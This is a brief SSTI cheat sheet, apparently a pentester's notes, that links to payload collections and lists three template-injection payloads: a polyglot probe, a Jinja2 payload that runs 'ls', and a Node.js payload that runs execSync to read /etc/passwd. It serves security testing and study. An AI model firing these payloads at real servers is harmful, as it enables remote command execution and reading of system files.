# Server Side Template Injection(SSTI)
- [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#constructing-a-server-side-template-injection-attack)
- [PayLoads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [PayLoads 2](https://github.com/payloadbox/ssti-payloads)
- [YouTube](https://www.youtube.com/watch?v=Ce6FGus9UYk&ab_channel=BePractical)

## Payloads:
- `${{<%[%'"}}%\.`
- `{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}`
- `{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')\")()}}` nodeJS